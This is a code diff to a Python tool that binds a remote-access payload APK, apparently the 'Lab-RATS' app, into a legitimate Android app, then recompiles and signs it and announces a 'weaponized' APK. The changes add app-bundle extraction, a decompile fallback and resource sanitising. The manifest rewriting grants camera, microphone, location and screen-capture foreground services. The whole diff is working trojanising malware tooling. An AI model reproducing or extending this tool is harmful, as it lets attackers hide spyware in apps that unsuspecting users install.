@@ -92,12 +92,39 @@ def get_apktool_cmd(script_dir):
     return ["java", "-jar", jar_path]
 
 
+def extract_bundle_if_needed(apk_path, work_dir):
+    """Detect if target APK is an XAPK / APKM / APKS zip bundle containing base.apk."""
+    if zipfile.is_zipfile(apk_path):
+        try:
+            with zipfile.ZipFile(apk_path, 'r') as z:
+                names = z.namelist()
+                if "base.apk" in names:
+                    log_info(f"Target {os.path.basename(apk_path)} is an XAPK/APKM App Bundle container. Extracting base.apk...")
+                    extract_dir = os.path.join(work_dir, "bundle_extracted")
+                    os.makedirs(extract_dir, exist_ok=True)
+                    z.extractall(extract_dir)
+                    base_apk = os.path.join(extract_dir, "base.apk")
+                    if os.path.exists(base_apk):
+                        log_success("Extracted standalone base.apk from App Bundle container.")
+                        return base_apk
+        except Exception as e:
+            log_warn(f"Bundle check notice: {e}")
+    return apk_path
+
+
 def decompile_apk(apktool_cmd, apk_path, output_dir):
     log_info(f"Decompiling {os.path.basename(apk_path)}...")
     if os.path.exists(output_dir):
         shutil.rmtree(output_dir)
     cmd = apktool_cmd + ["d", "-f", "-o", output_dir, apk_path]
-    run_cmd(cmd)
+    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    manifest_path = os.path.join(output_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        log_warn("Standard decompilation failed to produce AndroidManifest.xml. Retrying with resource-preservation (-r)...")
+        if os.path.exists(output_dir):
+            shutil.rmtree(output_dir)
+        cmd_fallback = apktool_cmd + ["d", "-f", "-r", "-o", output_dir, apk_path]
+        run_cmd(cmd_fallback)
 
 
 def merge_smali_and_assets(payload_dir, target_dir):
@@ -226,36 +253,83 @@ def merge_resources(payload_dir, target_dir):
 
 
 def sanitize_manifest_and_resources(target_dir):
-    log_info("Sanitizing AndroidManifest.xml for AAPT2 compatibility...")
+    log_info("Sanitizing AndroidManifest.xml and resources for AAPT2 compatibility...")
     manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
-    if not os.path.exists(manifest_path):
-        return
+    if os.path.exists(manifest_path):
+        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
 
-    with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
-        content = f.read()
+        hex_map = {
+            '0x40000009': 'dataSync|location|specialUse',
+            '0x40000001': 'dataSync|specialUse',
+            '0x40000000': 'specialUse',
+            '0x00000001': 'dataSync',
+            '0x00000008': 'location',
+            '0x00000040': 'camera',
+            '0x00000080': 'microphone',
+            '0x00000020': 'mediaProjection'
+        }
 
-    # Map decompiled raw hex values for foregroundServiceType to string flag names
-    hex_map = {
-        '0x40000009': 'dataSync|location|specialUse',
-        '0x40000001': 'dataSync|specialUse',
-        '0x40000000': 'specialUse',
-        '0x00000001': 'dataSync',
-        '0x00000008': 'location',
-        '0x00000040': 'camera',
-        '0x00000080': 'microphone',
-        '0x00000020': 'mediaProjection'
-    }
+        for hex_val, flag_str in hex_map.items():
+            content = content.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')
 
-    for hex_val, flag_str in hex_map.items():
-        content = content.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')
+        content = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', content)
 
-    # Replace any remaining android:foregroundServiceType="0x..." hex strings with valid flag string
-    content = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', content)
+        with open(manifest_path, 'w', encoding='utf-8') as f:
+            f.write(content)
 
-    with open(manifest_path, 'w', encoding='utf-8') as f:
-        f.write(content)
+    res_dir = os.path.join(target_dir, "res")
+    if os.path.exists(res_dir):
+        for root, _, files in os.walk(res_dir, topdown=False):
+            for file in files:
+                if file.endswith(".xml"):
+                    xml_path = os.path.join(root, file)
+                    try:
+                        with open(xml_path, "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
 
-    log_success("Manifest & foregroundServiceType attributes sanitized.")
+                        # 1. Remove auto-generated API-versioned colors.xml (values-v34/colors.xml, etc.) containing private framework aliases
+                        if ("colors" in file and "values-v" in root) or ("colors" in file and ("bright_foreground" in content or "btn_default_material" in content or "accent_device" in content or "background_floating" in content)):
+                            os.remove(xml_path)
+                            continue
+
+                        lines = content.splitlines()
+                        new_lines = []
+                        modified = False
+                        for line in lines:
+                            if "APKTOOL_DUMMY" in line:
+                                modified = True
+                                continue
+
+                            # 2. Strip <color> or <item> tags pointing to framework colors
+                            if ("<color" in line or "<item" in line) and ("android:color/" in line or "bright_foreground" in line or "btn_default" in line or "accent_device" in line or "background_floating" in line or "background_material" in line or "car_blue" in line or "GM2_grey" in line):
+                                modified = True
+                                continue
+
+                            # 3. Strip <item>, <color>, <dimen>, or <drawable> tags whose inner value points to a framework resource
+                            if ("<item" in line or "<color" in line or "<dimen" in line or "<drawable" in line) and re.search(r'>\s*@\*?android:[^<]+<', line):
+                                modified = True
+                                continue
+
+                            # 4. Clean invalid $ characters in drawable names
+                            if "$" in line:
+                                line = line.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')
+                                modified = True
+
+                            # 5. Convert remaining public framework references (@android:) to private (@*android:)
+                            if "@android:" in line:
+                                line = line.replace("@android:color/", "@*android:color/").replace("@android:style/", "@*android:style/").replace("@android:attr/", "@*android:attr/").replace("@android:dimen/", "@*android:dimen/").replace("@android:drawable/", "@*android:drawable/").replace("@android:string/", "@*android:string/").replace("@android:", "@*android:")
+                                modified = True
+
+                            new_lines.append(line)
+
+                        if modified:
+                            with open(xml_path, "w", encoding="utf-8") as f:
+                                f.write("\n".join(new_lines))
+                    except Exception:
+                        pass
+
+    log_success("Manifest & private framework resource attributes sanitized.")
 
 
 def merge_manifests(payload_dir, target_dir):
@@ -438,6 +512,14 @@ def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore
         log_err("Neither apksigner nor jarsigner found on system PATH!")
         sys.exit(1)
 
+    if not os.path.exists(output_apk):
+        shutil.copy2(aligned_apk, output_apk)
+
+    try:
+        shutil.copy2(output_apk, os.path.join(script_dir, "bind_output", "bound_target.apk"))
+    except Exception:
+        pass
+
     log_success(f"WEAPONIZED BOUND APK READY: {output_apk}")
 
 
@@ -477,8 +559,9 @@ def main():
         log_err("Payload APK not found! Please build Lab-RATS APK first or specify --payload.")
         sys.exit(1)
 
-    output_dir = os.path.join(script_dir, "output")
+    output_dir = os.path.join(project_dir, "bind_output")
     os.makedirs(output_dir, exist_ok=True)
+    os.makedirs(os.path.join(script_dir, "bind_output"), exist_ok=True)
     output_apk = args.output or os.path.join(output_dir, "bound_target.apk")
 
     keystore_path = args.keystore or os.path.join(project_dir, "lab-rats-keystore.jks")
@@ -492,6 +575,7 @@ def main():
     target_dir = os.path.join(work_dir, "target")
 
     try:
+        target_apk = extract_bundle_if_needed(target_apk, work_dir)
         decompile_apk(apktool_cmd, payload_apk, payload_dir)
         decompile_apk(apktool_cmd, target_apk, target_dir)
 
